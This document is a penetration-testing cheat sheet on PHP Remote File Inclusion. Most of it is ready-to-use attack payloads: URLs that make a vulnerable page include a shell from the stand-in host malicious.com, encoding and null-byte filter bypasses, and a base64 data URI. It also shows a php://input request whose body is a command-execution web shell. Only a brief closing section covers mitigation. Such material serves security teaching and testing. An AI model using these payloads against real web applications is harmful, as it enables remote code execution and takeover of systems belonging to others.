# Table of Contents
- [Definition](#definition)
- [Identifying](#identifying)
- [Crafting Payloads](#crafting-payloads)
- [Bypassing RFI Protections](#bypassing-rfi-protections)
   * [Encoding and Obfuscation Techniques](#encoding-and-obfuscation-techniques)
   * [Bypassing Null Byte Filters](#bypassing-null-byte-filters)
   * [Breaking Out of Filtered Paths](#breaking-out-of-filtered-paths)
- [Advanced RFI Exploitation Techniques](#advanced-rfi-exploitation-techniques)
   * [Leveraging File Uploads](#leveraging-file-uploads)
   * [Using Alternate Protocols](#using-alternate-protocols)
   * [PHP Wrappers](#php-wrappers)
- [Mitigating RFI Vulnerabilities](#mitigating-rfi-vulnerabilities)
   * [Input Validation and Sanitization](#input-validation-and-sanitization)
   * [Allow listing](#allow-listing)
   * [Disabling Remote Inclusions](#disabling-remote-inclusions)
   * [Code Reviews and Audits](#code-reviews-and-audits)

# Definition
RFI is a security vulnerability that allows attackers to include and execute remote files in the web application’s server-side code. This can lead to severe consequences, including remote code execution, data theft, and complete system compromise.

**Remote File Inclusion (RFI) attacks are a critical threat to web applications, allowing attackers to execute malicious code remotely.** Understanding how to exploit this vulnerability is essential for penetration testers and security professionals.

# Identifying
- Manual Testing: Begin by manually testing URL parameters or form inputs. For instance, try appending payloads like ```http://malicious.com/shell.php``` to the URL to see if the remote file is included.
- Using Burp Suite: Intercept HTTP requests with Burp Suite. Modify the parameters to include RFI payloads and observe the responses for signs of inclusion.

# Crafting Payloads
- Basic Payloads: Start with simple inclusion payloads. For example, to include a remote PHP script:

```http://vulnerable-website.com/index.php?page=http://malicious.com/shell.php```

- Advanced Payloads: Create more complex payloads to bypass basic filters. For example:

```http://vulnerable-website.com/index.php?page=http://malicious.com/shell.txt%00.php```

# Bypassing RFI Protections
## Encoding and Obfuscation Techniques
Attackers often use encoding techniques to bypass basic input filters and protections.

- URL Encoding: Encode special characters in the payload. For example:

```http://vulnerable-website.com/index.php?page=http%3A%2F%2Fmalicious.com%2Fshell.php```

- Double Encoding: Use double encoding to evade more sophisticated filters. For example:

```http://vulnerable-website.com/index.php?page=http%253A%252F%252Fmalicious.com%252Fshell.php```

- UTF-8 Encoding: Encode the payload using UTF-8:

```http://vulnerable-website.com/index.php?page=%c0%af%c0%afmalicious.com%c0%afshell.php```

## Bypassing Null Byte Filters
- Null Byte Injection: Inject a null byte (```%00```) to terminate a string early, bypassing file extension checks:

```http://vulnerable-website.com/index.php?page=http://malicious.com/shell.txt%00.php```

## Breaking Out of Filtered Paths
- Combined Encodings: Combine different encoding methods to evade detection:

```http://vulnerable-website.com/index.php?page=http%3A%2F%2Fmalicious.com%2Fshell.php```

# Advanced RFI Exploitation Techniques
## Leveraging File Uploads
- Uploading Malicious Files: Upload a malicious file to the server and include it via RFI. For example:

```http://vulnerable-website.com/index.php?page=uploads/shell.php```

## Using Alternate Protocols
- Data URI: Use the ```data:``` URI scheme to include base64-encoded payloads:

```http://vulnerable-website.com/index.php?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+```

## PHP Wrappers
- PHP Wrappers: Use PHP wrappers like ```php://input``` and ```php://filter``` to include code:

```http://vulnerable-website.com/index.php?page=php://input```

Then send the payload in the body of the request:

```<?php system($_GET['cmd']); ?>```

# Mitigating RFI Vulnerabilities
## Input Validation and Sanitization
Validate and sanitize user inputs to ensure they don’t contain malicious inclusion paths. Use libraries or built-in functions to escape special characters.

## Allow listing
Restrict the inclusion of files to only trusted, local sources using allowlists.

## Disabling Remote Inclusions
Configure the server to disable remote file inclusions in the PHP configuration:

```allow_url_include=0```

## Code Reviews and Audits
Regularly review and audit code to identify and fix RFI vulnerabilities.
